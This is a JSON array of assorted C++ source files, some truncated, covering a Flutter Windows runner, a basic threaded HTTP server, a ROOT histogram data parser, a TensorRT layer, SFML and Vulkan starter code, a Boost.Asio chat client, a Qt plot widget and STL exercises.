[
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"git_action\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"../lib/config.h\"\n#include <cstring>\n// handles messages from clients\nvoid *handle_client(void *client_fd);\n// void send_response(int client_fd);\n\nint main(int argc, char *argv[]) {\n  int server_fd;\n  long port_num = 8000;\n  struct sockaddr_in server_addr;\n  // create a socket\n  if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {\n    perror(\"Socket creation failed!\");\n    exit(1);\n  }\n\n  // configuring the server\n  server_addr.sin_family =\n      AF_INET; // ipv4 address family AF_INET6 for ipv6 address\n  server_addr.sin_addr.s_addr = INADDR_ANY; // accept connection on any network\n                                            // interface on the local machine\n  server_addr.sin_port =\n      htons(port_num); // htons converts host byte to network byte\n\n  // binding socket to a specific port and specific address\n  if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) <\n      0) {\n    perror(\"Binding failure!! Exiting..\");\n    exit(1);\n  }\n\n  // listen to the specified port\n  if (listen(server_fd, 2) < 0) {\n    perror(\"Error while listening on the port!!!\");\n    exit(1);\n  }\n\n  // listen for client\n  while (1) {\n    // client info\n    struct sockaddr_in client_addr;\n    socklen_t client_addr_len = sizeof(client_addr);\n    int *client_fd = static_cast<int *>(\n        malloc(sizeof(int))); // allocate memory for client_fd\n\n    if ((*client_fd = accept(server_fd, (struct sockaddr *)&client_addr,\n                             &client_addr_len)) < 0) {\n      perror(\"Couldn't accept the client connection!\");\n      // free(client_fd);\n      continue;\n    }\n\n    pthread_t thread_id;\n    if (pthread_create(&thread_id, NULL, handle_client, (void *)client_fd) !=\n        0) {\n      perror(\"Thread couldn't be created!!\");\n      free(client_fd);\n    }\n    pthread_detach(thread_id);\n  }\n\n  close(server_fd);\n  return EXIT_SUCCESS;\n}\n\nvoid *handle_client(void *client_fd_ptr) {\n  int client_fd = *((int *)client_fd_ptr);\n  // char *myMessage = new char[100]; // this doesn't print all the requests\n  // memset(myMessage, 0, 100);\n  // obtained from the client idk why\n  char myMessage[1024] = {0}; // but this does\n  // char *myMessage[1096]; // but this does\n  auto bytesRead = recv(client_fd, myMessage, sizeof(myMessage), 0);\n  if (bytesRead < 0) {\n    perror(\"\\nError reading from client!!\\n\");\n    close(client_fd);\n    free(client_fd_ptr);\n    return NULL;\n  }\n\n  std::cout << myMessage << std::endl;\n\n  std::string response = \"HTTP/1.1 200 OK\\r\\nContent-Type: \"\n                         \"text/html\\r\\n\\r\\n<html><body><h1>Hello there babygirl\"\n                         \"\ud83e\udef0</h1></body></html>\\r\\n\";\n\n  send(client_fd, response.c_str(), response.size(), 0);\n  // delete[] myMessage;\n  close(client_fd);\n  return NULL;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <string>\n#include <vector>\n#include <stdlib.h>\n#include<bits/stdc++.h>\nusing namespace std;\n\n\nvoid process_files(string filename,int daq){\n   ifstream in(filename, std::ios::binary );\n    if(!in) {\n      cout << \"Cannot open file!\" << endl;\n      return;\n   }\n    // Verifica se il file \u00e8 stato aperto correttamente\n    if (!in.is_open()) {\n        cerr << \"impossible to open the file!\" << endl;\n        return;\n    }\n    \n    TH1F* Hist_dtc_event_size = new TH1F(Form(\"Hist_dtc_event_size_%d\",daq),Form(\"Hist_dtc_event_size_%d\",daq), 70, 0.,70.);\n    TH1F* Hist_dtc_tag = new TH1F(Form(\"Hist_dtc_tag_%d\",daq),Form(\"Hist_dtc_tag_%d\",daq), 70, 0.,70.);\n    TH1F* Hist_residual_dtc_size = new TH1F(Form(\"Hist_residual_dtc_size_%d\",daq),Form(\"Hist_residual_dtc_size_%d\",daq), 70, 0.,70.);\n    TH2F* Hist_event_vs_dtc_size = new TH2F(Form(\"Hist_event_vs_dtc_size_%d\",daq),Form(\"Hist_event_vs_dtc_size_%d\",daq), 70, 0.,70.,70, 0.,70.);\n    TH2F* Hist_event_vs_dtc_tag = new TH2F(Form(\"Hist_event_vs_dtc_tag_%d\",daq),Form(\"Hist_event_vs_dtc_tag_%d\",daq), 70, 0.,70.,70, 0.,70.);\n    TH2F* Hist_event_vs_roc_size = new TH2F(Form(\"Hist_event_vs_roc_size_%d\",daq),Form(\"Hist_event_vs_roc_size_%d\",daq), 500, 0.,500.,70, 0.,70.);\n    TH2F* Hist_event_vs_roc_status = new TH2F(Form(\"Hist_event_vs_roc_status_%d\",daq),Form(\"Hist_event_vs_roc_status_%d\",daq), 500, 0.,500.,400, 0.,400.);\n    TH2F* Hist_roc_size_vs_roc_status = new TH2F(Form(\"Hist_roc_size_vs_roc_status_%d\",daq),Form(\"Hist_roc_size_vs_roc_status_%d\",daq), 70, 0.,70.,400, 0.,400.);\n    TH1F* Hist_line_number_dtc = new TH1F(Form(\"Hist_line_number_dtc_%d\",daq),Form(\"Hist_line_number_dtc_%d\",daq), 2000, 0.,2000.);\n    TH1F* Hist_num_events = new TH1F(Form(\"Hist_num_events_%d\",daq),Form(\"Hist_num_events_%d\",daq), 70, 0.,70.);\n    TH2F* Hist_dtc_event_size_vs_line_number_dtc = new TH2F(Form(\"Hist_dtc_event_size_vs_line_number_dtc_%d\",daq),Form(\"Hist_dtc_event_size_vs_line_number_dtc_%d\",daq), 70, 0.,70.,2000, 0.,2000.);\n    TH1F* Hist_line_number_roc = new TH1F(Form(\"Hist_line_number_roc_%d\",daq),Form(\"Hist_line_number_roc_%d\",daq), 2000, 0.,2000.);\n    TH1F* Hist_roc_size = new TH1F(Form(\"Hist_roc_size_%d\",daq),Form(\"Hist_roc_size_%d\",daq), 70, 0.,70.);\n    TH1F* Hist_NUM_ROCS = new TH1F(Form(\"Hist_NUM_ROCS_%d\",daq),Form(\"Hist_NUM_ROCS_%d\",daq), 70, 0.,70.);\n    TH2F* Hist_roc_size_vs_line_number_roc = new TH2F(Form(\"Hist_roc_size_vs_line_number_roc_%d\",daq),Form(\"Hist_roc_size_vs_line_number_roc_%d\",daq), 70, 0.,70.,2000, 0.,2000.);\n    TH2F* Hist_dtc_size_vs_roc_size = new TH2F(Form(\"Hist_dtc_size_vs_roc_size_%d\",daq),Form(\"Hist_dtc_size_vs_roc_size_%d\",daq),70, 0.,70.,70, 0.,70.);\n\nint k=0;\nunsigned char lo;\nint loc = 0;\nunsigned char hi;\nint num_events=0;\nint dtc_size=-1;\nvector<int> dtc_size_vec;\nvector<int> dtc_tag_vec;\nvector<int> roc_size_vec;\nvector<float> roc_status_vec;\n\nint lines_count=0;\nint line_number_dtc=0;\nint roc_size=-1;\nint line_number_roc=0;\nint num_roc=0;\nint NUM_ROC=0;\nint val=0;\nint tot_dtc_size=0;\nint tot_roc_size=0;\nint val_status=0;\n int size_tot=0;\nwhile(!in.eof()){\n    //for (int i=0; i<2016; i++) {\n    if (loc == 0){\n       printf(\" 0x%08x: \",k*2);\n       lines_count++;\n    }\n    in.read(reinterpret_cast<char*>(&lo), 1); \n    in.read(reinterpret_cast<char*>(&hi), 1);\n    int size = (hi << 8) | lo;\n    //printf(\"0x%04x \",size);\n\n    if(loc==0 & dtc_size==-1){\n        dtc_size=size>>4;\n        dtc_size_vec.push_back(dtc_size);\n        tot_dtc_size+=dtc_size;\n        line_number_dtc=lines_count;\n        num_events++;\n        Hist_dtc_event_size->Fill(dtc_size);\n        Hist_line_number_dtc->Fill(line_number_dtc);\n        Hist_dtc_event_size_vs_line_number_dtc->Fill(dtc_size,line_number_dtc);\n        val=1;\n    }\n    if(loc==2 and val==1){\n        dtc_tag_vec.push_back(size);\n        Hist_dtc_tag->Fill(size);\n        val=0;\n    }\n    if(loc==0 & roc_size==-1 & lines_count>line_number_dtc+2){\n        roc_size=size>>4;\n        val_status=1;\n        tot_roc_size+=roc_size;\n        roc_size_vec.push_back(roc_size);\n        line_number_roc=lines_count;\n        num_roc++;\n        NUM_ROC++;\n        Hist_roc_size->Fill(roc_size);\n        Hist_line_number_roc->Fill(line_number_roc);\n        Hist_roc_size_vs_line_number_roc->Fill(roc_size,line_number_roc);\n        Hist_dtc_size_vs_roc_size->Fill(dtc_size,roc_size);\n    }\n\n    if(loc==6 & val_status==1){\n        roc_status_vec.push_back(size/4.);\n    }\nif(loc==7 & val_status==1){\n  printf(\"SONO QUI\");\n        val_status=0;\n\tsize_tot+=size;\nprintf(\"0x%04x \",size);\n    }\n    loc += 1;\n    if (loc == 8) {\n        printf(\"\\n\");\n        loc  = 0;\n    }\n    if((line_number_dtc+dtc_size-1)==lines_count){\n        dtc_size=-1;\n        Hist_NUM_ROCS->Fill(NUM_ROC);\n        NUM_ROC=0;\n    }\n    if((line_number_roc+roc_size-1)==lines_count){\n        roc_size=-1;\n    }\n \n  //  if(dtc_size==){\n    //    Hist_line_number_vs_error_code->Fill(line_number_dtc,error_c",
    "/*\n * Created by Marcos Luciano\n * https://www.github.com/marcoslucianops\n */\n\n#include \"deconvolutional_layer.h\"\n\n#include <cassert>\n\nnvinfer1::ITensor*\ndeconvolutionalLayer(int layerIdx, std::map<std::string, std::string>& block, std::vector<float>& weights,\n    std::vector<nvinfer1::Weights>& trtWeights, int& weightPtr, int& inputChannels, nvinfer1::ITensor* input,\n    nvinfer1::INetworkDefinition* network, std::string layerName)\n{\n  nvinfer1::ITensor* output;\n\n  assert(block.at(\"type\") == \"deconvolutional\");\n  assert(block.find(\"filters\") != block.end());\n  assert(block.find(\"pad\") != block.end());\n  assert(block.find(\"size\") != block.end());\n  assert(block.find(\"stride\") != block.end());\n\n  int filters = std::stoi(block.at(\"filters\"));\n  int padding = std::stoi(block.at(\"pad\"));\n  int kernelSize = std::stoi(block.at(\"size\"));\n  int stride = std::stoi(block.at(\"stride\"));\n  int bias = filters;\n\n  int groups = 1;\n  if (block.find(\"groups\") != block.end())\n    groups = std::stoi(block.at(\"groups\"));\n\n  if (block.find(\"bias\") != block.end())\n    bias = std::stoi(block.at(\"bias\"));\n\n  int pad;\n  if (padding)\n    pad = (kernelSize - 1) / 2;\n  else\n    pad = 0;\n\n  int size = filters * inputChannels * kernelSize * kernelSize / groups;\n  std::vector<float> bnBiases;\n  std::vector<float> bnWeights;\n  std::vector<float> bnRunningMean;\n  std::vector<float> bnRunningVar;\n  nvinfer1::Weights convWt {nvinfer1::DataType::kFLOAT, nullptr, size};\n  nvinfer1::Weights convBias {nvinfer1::DataType::kFLOAT, nullptr, bias};\n\n  float* val;\n  if (bias != 0) {\n    val = new float[filters];\n    for (int i = 0; i < filters; ++i) {\n        val[i] = weights[weightPtr];\n        ++weightPtr;\n    }\n    convBias.values = val;\n    trtWeights.push_back(convBias);\n  }\n  val = new float[size];\n  for (int i = 0; i < size; ++i) {\n      val[i] = weights[weightPtr];\n      ++weightPtr;\n  }\n  convWt.values = val;\n  trtWeights.push_back(convWt);\n\n  nvinfer1::IDeconvolutionLayer* conv = network->addDeconvolutionNd(*input, filters,\n      nvinfer1::Dims{2, {kernelSize, kernelSize}}, convWt, convBias);\n  assert(conv != nullptr);\n  std::string convLayerName = \"deconv_\" + layerName + std::to_string(layerIdx);\n  conv->setName(convLayerName.c_str());\n  conv->setStrideNd(nvinfer1::Dims{2, {stride, stride}});\n  conv->setPaddingNd(nvinfer1::Dims{2, {pad, pad}});\n\n  if (block.find(\"groups\") != block.end())\n    conv->setNbGroups(groups);\n\n  output = conv->getOutput(0);\n\n  return output;\n}\n",
    "\n//\n// Disclaimer:\n// ----------\n//\n// This code will work only if you selected window, graphics and audio.\n//\n// In order to load the resources like background.png, you have to set up\n// your target scheme:\n//\n// - Select \"Edit Scheme\u2026\" in the \"Product\" menu;\n// - Check the box \"use custom working directory\";\n// - Fill the text field with the folder path containing your resources;\n//        (e.g. your project folder)\n// - Click OK.\n//\n\n#include <SFML/Audio.hpp>\n#include <SFML/Graphics.hpp>\n\nint main(int argc, char const** argv)\n{\n    // Create the main window\n    sf::RenderWindow window(sf::VideoMode(800, 600), \"SFML window\");\n\n    // Set the Icon\n    sf::Image icon;\n    if (!icon.loadFromFile(\"icon.png\")) {\n        return EXIT_FAILURE;\n    }\n    window.setIcon(icon.getSize().x, icon.getSize().y, icon.getPixelsPtr());\n\n    // Load a sprite to display\n    sf::Texture texture;\n    if (!texture.loadFromFile(\"background.jpg\")) {\n        return EXIT_FAILURE;\n    }\n    sf::Sprite sprite(texture);\n\n    // Create a graphical text to display\n    sf::Font font;\n    if (!font.loadFromFile(\"tuffy.ttf\")) {\n        return EXIT_FAILURE;\n    }\n    sf::Text text(\"Hello SFML\", font, 50);\n    text.setFillColor(sf::Color::Black);\n\n    // Load a music to play\n    sf::Music music;\n    if (!music.openFromFile(\"doodle_pop.ogg\")) {\n        return EXIT_FAILURE;\n    }\n\n    // Play the music\n    music.play();\n\n    // Start the game loop\n    while (window.isOpen())\n    {\n        // Process events\n        sf::Event event;\n        while (window.pollEvent(event))\n        {\n            // Close window: exit\n            if (event.type == sf::Event::Closed) {\n                window.close();\n            }\n\n            // Escape pressed: exit\n            if (event.type == sf::Event::KeyPressed && event.key.code == sf::Keyboard::Escape) {\n                window.close();\n            }\n        }\n\n        // Clear screen\n        window.clear();\n\n        // Draw the sprite\n        window.draw(sprite);\n\n        // Draw the string\n        window.draw(text);\n\n        // Update the window\n        window.display();\n    }\n\n    return EXIT_SUCCESS;\n}\n",
    "#define VK_USE_PLATFORM_WIN32_KHR\n#define GLFW_INCLUDE_VULKAN\n#include <GLFW/glfw3.h>\n#define GLFW_EXPOSE_NATIVE_WIN32\n#include <GLFW/glfw3native.h>\n\n#define GLM_FORCE_DEPTH_ZERO_TO_ONE\n#include <glm/vec4.hpp>\n#include <glm/mat4x4.hpp>\n\n#include <iostream>\n#include <cstring>\n#include <optional>\n#include <set>\n#include <cstdint>\n#include <limits>\n#include <algorithm>\n\nconst uint32_t WINDOWWIDTH = 800;\nconst uint32_t WINDOWHEIGHT = 600;\n\nconst std::vector<const char*> validationLayers = {\n\t\"VK_LAYER_KHRONOS_validation\"\n};\n\nconst std::vector<const char*> deviceExtensions = {\n\tVK_KHR_SWAPCHAIN_EXTENSION_NAME\n};\n\n#ifdef NDEBUG\nconst bool enableValidationLayers = false;\n#else\nconst bool enableValidationLayers = true;\n#endif\n\nstruct QueueFamilyIndices {\n\tstd::optional<uint32_t> graphicsFamily;\n\tstd::optional<uint32_t> presentFamily;\n\n\tbool isComplete() {\n\t\treturn graphicsFamily.has_value() && presentFamily.has_value();\n\t}\n};\n\nstruct SwapChainSupportDetails {\n\tVkSurfaceCapabilitiesKHR capabilities;\n\tstd::vector<VkSurfaceFormatKHR> formats;\n\tstd::vector<VkPresentModeKHR> presentModes;\n};\n\nVkResult CreateDebugUtilsMessengerEXT(VkInstance instance, const VkDebugUtilsMessengerCreateInfoEXT* pCreateInfo, const VkAllocationCallbacks* pAllocator, VkDebugUtilsMessengerEXT* pDebugMessenger) {\n\tauto func = (PFN_vkCreateDebugUtilsMessengerEXT)vkGetInstanceProcAddr(instance, \"vkCreateDebugUtilsMessengerEXT\");\n\tif (func != nullptr) {\n\t\treturn func(instance, pCreateInfo, pAllocator, pDebugMessenger);\n\t}\n\telse {\n\t\treturn VK_ERROR_EXTENSION_NOT_PRESENT;\n\t}\n}\n\nvoid DestroyDebugUtilsMessengerEXT(VkInstance instance, VkDebugUtilsMessengerEXT debugMessenger, const VkAllocationCallbacks* pAllocator) {\n\tauto func = (PFN_vkDestroyDebugUtilsMessengerEXT)vkGetInstanceProcAddr(instance, \"vkDestroyDebugUtilsMessengerEXT\");\n\tif (func != nullptr) {\n\t\tfunc(instance, debugMessenger, pAllocator);\n\t}\n}\n\nclass HelloTriangleApplication {\npublic: \n\tvoid run() {\n\t\tinitWindow();\n\t\tinitVulkan();\n\t\tmainLoop();\n\t\tcleanup();\n\t}\n\nprivate:\n\tGLFWwindow* window;\n\tVkInstance instance;\n\tVkDebugUtilsMessengerEXT debugMessenger;\n\tVkPhysicalDevice physicalDevice = VK_NULL_HANDLE;\n\tVkDevice device;\n\tVkQueue graphicsQueue;\n\tVkSurfaceKHR surface;\n\tVkQueue presentQueue;\n\tVkSwapchainKHR swapChain;\n\tstd::vector<VkImage> swapChainImages;\n\tVkFormat swapChainImageFormat;\n\tVkExtent2D swapChainExtent;\n\n\tvoid createInstance() {\n\t\tif (enableValidationLayers && !checkValidationLayerSupport()) {\n\t\t\tthrow std::runtime_error(\"Validation layers are not available.\");\n\t\t}\n\t\t\n\t\tVkApplicationInfo appInfo{};\n\t\tappInfo.sType = VK_STRUCTURE_TYPE_APPLICATION_INFO;\n\t\tappInfo.pApplicationName = \"Hello Triangle\";\n\t\tappInfo.applicationVersion = VK_MAKE_VERSION(1, 0, 0);\n\t\tappInfo.pEngineName = \"No Engine\";\n\t\tappInfo.engineVersion = VK_MAKE_VERSION(1, 0, 0);\n\t\tappInfo.apiVersion = VK_API_VERSION_1_0;\n\n\t\tVkInstanceCreateInfo createInfo{};\n\t\tcreateInfo.sType = VK_STRUCTURE_TYPE_INSTANCE_CREATE_INFO;\n\t\tcreateInfo.pApplicationInfo = &appInfo;\n\n\t\tauto extensions = getRequiredExtensions();\n\t\tcreateInfo.enabledExtensionCount = static_cast<uint32_t>(extensions.size());\n\t\tcreateInfo.ppEnabledExtensionNames = extensions.data();\n\n\t\tVkDebugUtilsMessengerCreateInfoEXT debugCreateInfo{};\n\t\tif (enableValidationLayers) {\n\t\t\tcreateInfo.enabledLayerCount = static_cast<uint32_t>(validationLayers.size());\n\t\t\tcreateInfo.ppEnabledLayerNames = validationLayers.data();\n\n\t\t\tpopulateDebugMessengerCreateInfo(debugCreateInfo);\n\t\t\tcreateInfo.pNext = (VkDebugUtilsMessengerCreateInfoEXT*)&debugCreateInfo;\n\t\t}\n\t\telse {\n\t\t\tcreateInfo.enabledLayerCount = 0;\n\t\t\tcreateInfo.pNext = nullptr;\n\t\t}\n\n\t\tif (vkCreateInstance(&createInfo, nullptr, &instance) != VK_SUCCESS) {\n\t\t\tthrow std::runtime_error(\"Failed to create Vulkan instance.\");\n\t\t}\n\t}\n\n\tvoid initWindow() {\n\t\tglfwInit();\n\t\tglfwWindowHint(GLFW_CLIENT_API, GLFW_NO_API);\n\t\tglfwWindowHint(GLFW_RESIZABLE, GLFW_FALSE);\n\n\t\twindow = glfwCreateWindow(WINDOWWIDTH, WINDOWHEIGHT, \"Vulkan\", nullptr, nullptr);\n\t}\n\n\tvoid initVulkan() {\n\t\tcreateInstance();\n\t\tsetupDebugManager();\n\t\tcreateSurface();\n\t\tpickPhysicalDevice();\n\t\tcreateLogicalDevice();\n\t\tcreateSwapChain();\n\t}\n\n\tvoid createSurface() {\n\t\tif (glfwCreateWindowSurface(instance, window, nullptr, &surface) != VK_SUCCESS) {\n\t\t\tthrow std::runtime_error(\"Failed to create window surface!\");\n\t\t}\n\t}\n\n\tvoid createSwapChain() {\n\t\tSwapChainSupportDetails swapChainSupport = querySwapChainSupport(physicalDevice);\n\n\t\tVkSurfaceFormatKHR surfaceFormat = chooseSwapSurfaceFormat(swapChainSupport.formats);\n\t\tVkPresentModeKHR presentMode = chooseSwapPresentMode(swapChainSupport.presentModes);\n\t\tVkExtent2D extent = chooseSwapExtent(swapChainSupport.capabilities);\n\n\t\tuint32_t imageCount = swapChainSupport.capabilities.minImageCount + 1;\n\n\t\tif (swapChainSupport.capabilities.maxImageCount > 0 && imageCount > swapChainSupport.capabilities.maxImageCount) {\n\t\t\timageCount = swapChainSupport.capabilities.maxImageCount;\n\t\t}\n\n\t\tVkSwapchainCreateInfoKHR createInfo{};\n\t\tc",
    "#include <boost/asio.hpp>\n#include <boost/asio/io_context.hpp>\n#include <boost/exception/exception.hpp>\n#include <spdlog/spdlog.h>\n#include <nlohmann/json.hpp>\n#include <fstream>\n#include <stdexcept>\n#include <iostream>\n#include <print>\n\nusing json = nlohmann::json;\nnamespace asio = boost::asio;\n\nint main()\n{\n    std::ifstream config_json_fstream{ \"config.json\" };\n\n    if (!config_json_fstream)\n    {\n        spdlog::info(\"Config file missing, trying to create one\");\n    }\n    else\n    {\n        spdlog::info(\"Config file found\");\n    }\n\n    json config_json = json::parse(config_json_fstream);\n\n    //  \u4ece\u6587\u4ef6\u5185\u8bfb\u53d6 server \u7684 ip, port, username\n    auto address_string = config_json[\"server ip\"].get<std::string>();\n    auto port_string = config_json[\"port\"].get<std::string>();\n    auto username = config_json[\"username\"].get<std::string>();\n    \n    //  \u5982\u679c Server ip \u4e0e Port \u4efb\u610f\u4e00\u680f\u4e3a\u7a7a, \u5219\u629b\u51fa\u5f02\u5e38\n    if (address_string.empty())\n    {\n        spdlog::critical(\"Server ip cannot be null !\");\n        throw std::logic_error{\"Server ip adress read from config is null !\"};\n    }\n\n    if (port_string.empty())\n    {\n        spdlog::critical(\"Server port cannot be null !\");\n        throw std::logic_error{\"Server port read from config is null\"};\n    }\n\n    if (username.empty())\n    {\n        spdlog::critical(\"User name cannot be null !\");\n        throw std::logic_error{\"Username read from config is null\"};\n    }\n\n    //  \u5c06 Server ip \u8f6c\u6362\u6210 ip::address\n    auto address = asio::ip::address::from_string(address_string);    \n\n    //  \u5c06 Port String \u8f6c\u6362\u6210\u6570\u5b57\n    std::uint_least16_t port{};\n    std::from_chars(port_string.data(), port_string.data() + port_string.size(), port);\n\n    //  \u5b9a\u4e49 Socket\n    asio::io_context io_context{};\n    asio::ip::tcp::socket socket{ io_context };\n\n    //  \u8981\u8fde\u63a5\u5230\u7684\u76ee\u6807 Server\n    asio::ip::tcp::endpoint endpoint{address, port};\n\n    //  \u8fde\u63a5\u5230\u670d\u52a1\u5668\n    socket.connect(endpoint);\n    spdlog::info(\"Trying to connect to server: {}:{}\", endpoint.address().to_string(), endpoint.port());\n\n\n    if (socket.is_open())\n        spdlog::info(\"Successfully connected, Username: {}\", username);\n    else\n    {\n        spdlog::critical(\"Connect failed !\");\n        throw std::logic_error{\"Cannot connect to the server\"};\n    }\n\n    //  \u63a5\u6536\u4fe1\u606f\u7684\u7f13\u51b2\u533a buffer\n    constexpr std::size_t buffer_size{ 4096 };\n    std::array<unsigned char, buffer_size> buffer{};\n\n    while (true)\n    {\n        std::print(\"{} >> \", username);\n        std::string message{};\n        std::getline(std::cin, message);\n\n        if (message == \"/exit\")\n        {\n            socket.close();\n            break;\n        }\n        else if (message.empty())\n            continue;\n        \n        socket.write_some(asio::buffer(message));\n\n        auto read_length = socket.read_some(asio::buffer(buffer));\n        std::string read_message{buffer.begin(), buffer.begin() + read_length};\n        std::println(\"{} >> {}\", username, read_message);\n    }\n}",
    "#include \"widget.h\"\n#include \"ui_widget.h\"\n\n#include <memory>\n#include <vector>\n#include <QtConcurrent/QtConcurrent>\n#include <cstring>\n#include <algorithm>\n\nWidget::Widget(QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::Widget)\n{\n    ui->setupUi(this);\n\n    std::vector<int32_t> tmp;\n    QVector<double> valueY;\n    QVector<double> valueX;\n    std::unique_ptr<QFile> file(std::make_unique<QFile>(\"E:\\\\Qt_Projects\\\\Voenny_qwewqe.txt\"));\n    qDebug() << sizeof (int32_t);\n    if(file->open(QIODevice::ReadOnly))\n    {\n        QByteArray arr = file->read(2064);\n        qDebug() << arr;\n        for(int i = 8 ; i < arr.size() - 8; i += sizeof (int32_t))\n        {\n            int32_t value;\n            std::memcpy(&value, arr.data()+i, sizeof (int32_t));\n            tmp.emplace_back(value);\n        }\n        //tmp.insert(tmp.end(), arr.begin() + 8, arr.end());\n        file->close();\n    }\n    qDebug() << tmp.size();\n\n    for(size_t i = 0 ; i < tmp.size(); ++i)\n    {\n         valueY.push_back(abs(std::move(tmp[i])));\n         double freq = (48.875/1024) * i;\n         valueX.push_back(freq);\n    }\n\n    QCPGraph *graph = ui->widget->addGraph();\n    graph->setData(valueX,valueY);\n    graph->setLineStyle(QCPGraph::lsNone);\n\n    //qDebug() << valueY;\n   // qDebug() << valueX;\n\n    for(int i=0; i<valueX.size(); ++i)\n    {\n        QVector<double> lineX(2), lineY(2);\n        QCPCurve *verticalLine = new QCPCurve(ui->widget->xAxis, ui->widget->yAxis);\n        lineX[0] = static_cast<double>(valueX[i]);\n        lineX[1] = static_cast<double>(valueX[i]);\n        lineY[0] = 0;\n        lineY[1] = static_cast<double>(valueY[i]);\n        verticalLine->setData(lineX, lineY);\n        verticalLine->setPen(QPen(Qt::black));\n    }\n\n\n    ui->widget->setInteraction(QCP::iRangeZoom);\n    ui->widget->setInteraction(QCP::iRangeDrag);\n    ui->widget->axisRect()->setRangeZoomAxes(ui->widget->xAxis, ui->widget->yAxis);\n    ui->widget->axisRect()->setRangeDragAxes(ui->widget->xAxis, ui->widget->yAxis);\n    ui->widget->rescaleAxes();\n    ui->widget->replot();\n\n\n    connect(ui->widget, &QCustomPlot::mousePress, [this](QMouseEvent *event){\n       double x = ui->widget->xAxis->pixelToCoord(event->pos().x());\n       double y = ui->widget->yAxis->pixelToCoord(event->pos().y());\n       QToolTip::showText(event->globalPos(), QString(\"(%1, %2)\").arg(x).arg(y), ui->widget);\n    });\n}\n\n\n\nWidget::~Widget()\n{\n    delete ui;\n}\n\n",
    "\\\\ created by Ulugbek Oribov\n\n\n#include <iostream>\n#include <map>\n#include <vector>\n#include <algorithm>\n#include <cctype>\n#include <unordered_map>\n#include <string>\n#include <set>\n#include <unordered_set>\n#include <random>\n#include <ctime>\n#include <queue>\n#include <algorithm>\n#include <stack>\nusing namespace std;\nvoid outputMap(const map<int, double>& myMap) {\n for (const auto& pair : myMap) {\n cout << pair.first << \": \" << pair.second << endl;\n }\n}\nvoid displayPairs(const unordered_map<string, int>& myMap) {\n cout << \"Pairs in the map:\\n\";\n for (const auto& pair : myMap) {\n cout << pair.first << \": \" << pair.second << endl;\n }\n}\nvoid show(const set<int>& s) {\n cout << \"Elements in sorted order:\";\n for (auto it = s.begin(); it != s.end(); ++it) {\n cout << \" \" << *it;\n }\n cout << endl;\n}\nvoid show(const unordered_set<int>& s) {\n cout << \"Elements:\";\n for (auto it = s.begin(); it != s.end(); ++it) {\n cout << \" \" << *it;\n }\n cout << endl;\n}\nvoid show(const multiset<int>& s) {\n cout << \"Elements:\";\n for (auto it = s.begin(); it != s.end(); ++it) {\n cout << \" \" << *it;\n }\n cout << endl;\n}\nbool isSymmetric(const vector<int>& nums) {\n int n = nums.size();\n if (n == 0) return false;\n // Sort the numbers\n vector<int> sorted_nums = nums;\n sort(sorted_nums.begin(), sorted_nums.end());\n // Check if the sequence is symmetric\n for (int i = 0; i < n; ++i) {\n if (sorted_nums[i] % 10 != sorted_nums[n - 1 - i] % 10) {\n return false;\n }\n }\n return true;\n}\nvoid displayQueue(queue<int> q) {\n cout << \"Elements in the queue:\";\n while (!q.empty()) {\n cout << \" \" << q.front();\n q.pop();\n }\n cout << endl;\n}\nvoid clearQueue(queue<int>& q) {\n while (!q.empty()) {\n q.pop();\n }\n}\nint main() {\n std::cout<<\"Problem_1\"<<std::endl;\n std::map<int, int> m;\n // Insert key-value pairs\n m.insert({1, 1});\n m.insert({2, 4});\n m.insert({3, 9});\n m.insert({4, 16});\n m.insert({5, 25});\n // Print the contents of the map\n std::cout << \"Contents of the map:\" << std::endl;\n for (const auto& pair : m) {\n std::cout << \"Key: \" << pair.first << \", Value: \" << pair.second << std::endl;\n }\n std::cout<<\"Problem_2\"<<std::endl;\n map<int, string> competitionResults;\n vector<pair<int, string>> students = {{74, \"Mike\"}, {76, \"Elena\"}, {93, \"David\"},\n{70, \"George\"}, {89, \"Indira\"}};\n // Sort students based on their grades\n sort(students.begin(), students.end(), greater<pair<int, string>>());\n // Store students' places and names in the map\n for (size_t i = 0; i < students.size(); ++i) {\n competitionResults[i + 1] = students[i].second;\n }\n // Output the results\n for (const auto& result : competitionResults) {\n cout << result.first << \" place is \" << result.second << \".\\n\";\n }\n std::cout<<\"Problem_3\"<<std::endl;\n // Create a map to store uppercase letters and their positions\n map<char, int> alphabetPositions;\n // Populate the map\n for (char letter = 'A'; letter <= 'Z'; ++letter) {\n alphabetPositions[letter] = letter - 'A' + 1;\n }\n // Prompt the user to input a letter\n cout << \"Enter an uppercase letter: \";\n char inputLetter;\n cin >> inputLetter;\n // Convert the input letter to uppercase if it's lowercase\n inputLetter = toupper(inputLetter);\n // Check if the input letter exists in the map\n if (alphabetPositions.find(inputLetter) != alphabetPositions.end()) {\n // Print the position of the input letter\n cout << \"Position of \" << inputLetter << \" is \" <<\nalphabetPositions[inputLetter] << endl;\n } else {\n cout << \"Invalid input. Please enter an uppercase letter.\" << endl;\n }\n std::cout<<\"Problem_4\"<<std::endl;\n // 1. Create a map with the given pairs\n map<int, double> myMap = {{4, 7.5}, 